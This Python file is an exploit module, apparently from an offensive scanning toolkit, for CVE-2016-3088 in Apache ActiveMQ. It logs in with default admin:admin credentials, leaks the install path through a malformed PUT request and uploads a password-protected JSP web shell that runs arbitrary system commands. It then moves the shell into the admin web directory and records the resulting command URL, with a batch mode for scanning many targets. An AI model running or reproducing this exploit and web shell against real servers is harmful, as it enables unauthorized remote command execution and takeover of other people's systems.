#!/user/bin/env python3
# -*- coding: utf-8 -*-
# Author:gshell

import requests
import re
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2016_3088:
    def check(self,url):
        headers = {
            "Authorization": "Basic YWRtaW46YWRtaW4=",
            "User-Agent": self.header,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        url1 = url + "/fileserver/a../../%08/..%08/.%08/%08"
        try:
            r1 = requests.put(url=url1, headers=headers, allow_redirects=False, timeout=self.timout,proxies=self.proxy,verify=self.ssl)
            if r1.status_code == 500:
                path = re.findall(r"(.*)fileserver", r1.reason)[0]
                if not self.batch:
                    OutPrintInfo('ActiveMQ',f'[b bright_yellow]ActiveMQ_put_path：{path}')
                # print('{}：put ok'.format(url))
                url2 = url + "/fileserver/guo.txt"
                payload = '''<%
        if("gshell".equals(request.getParameter("pwd"))){
            java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("shell")).getInputStream();
            int a = -1;
            byte[] b = new byte[2048];
            out.print("<pre>");
            while((a=in.read(b))!=-1){
                out.println(new String(b));
            }
            out.print("</pre>");
        }
    %>
    '''
                r2 = requests.put(url=url2, headers=headers, data=payload, allow_redirects=False, timeout=self.timout,proxies=self.proxy,verify=self.ssl)
                if r2.status_code == 204:
                    if not self.batch:
                        OutPrintInfo("ActiveMQ",f"[b bright_yellow]ActiveMQ_put__txt：{url2}")

                    headers_move = {
                        "User-Agent": self.header,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Accept-Encoding": "gzip, deflate", "Authorization": "Basic YWRtaW46YWRtaW4=",
                        "Destination": "file://" + path + "admin/guo.jsp",
                        "Connection": "close",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "max-age=0"}
                    r3 = requests.request('MOVE', url=url2, headers=headers_move, allow_redirects=False, timeout=self.timout,proxies=self.proxy,verify=self.ssl)
                    # print(r3.status_code)
                    if r3.status_code == 204:
                        if not self.batch:
                            OutPrintInfo("ActiveMQ",f"[b bright_red]ActiveMQ_Putshell：{url}/admin/guo.jsp")
                            OutPrintInfoSuc("ActiveMQ",f"ActiveMQ_Putshell_CMD：{url}/admin/guo.jsp?pwd=gshell&shell=whoami")
                            OutPrintInfo("ActiveMQ",f"[b bright_red]注，连接Shell需要在自定义请求头加上认证参数，如下:")
                            OutPrintInfo("ActiveMQ",f"[b bright_red]Authorization:Basic YWRtaW46YWRtaW4=")
                        else:
                            OutPrintInfoSuc("ActiveMQ",f"ActiveMQ_Putshell_CMD：{url}/admin/guo.jsp?pwd=gshell&shell=whoami")
                            OutPutFile("apache_activemq_putshell.txt",f"ActiveMQ_Putshell_CMD：{url}/admin/guo.jsp?pwd=gshell&shell=whoami,请求头设置Authorization:Basic YWRtaW46YWRtaW4=")
                else:
                    if not self.batch:
                        OutPrintInfo("ActiveMQ",f"ActiveMQ_put__txt Error")
            else:
                if not self.batch:
                    OutPrintInfo("ActiveMQ","ActiveMQ_put not vuln")
        except Exception:
            if not self.batch:
                OutPrintInfo("ActiveMQ","目标请求出错")


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        self.timout = int(target["timeout"])
        _, self.proxy = ReqSet(header=self.header, proxy=proxy, bwork=self.batch)

        if not self.batch:
            print('''
          ____                       _            _  _ 
         |  _ \                     | |          | || |
         | |_) | _   _    __ _  ___ | |__    ___ | || |
         |  _ < | | | |  / _` |/ __|| '_ \  / _ \| || |
         | |_) || |_| | | (_| |\__ \| | | ||  __/| || |
         |____/  \__, |  \__, ||___/|_| |_| \___||_||_|
                  __/ |   __/ |                        
                 |___/   |___/
                ''')
            OutPrintInfo("ActiveMQ", "Start ActiveMQ_put checking...")
        self.check(url)
        if not self.batch:
            OutPrintInfo("ActiveMQ", "ActiveMQ_put check end")
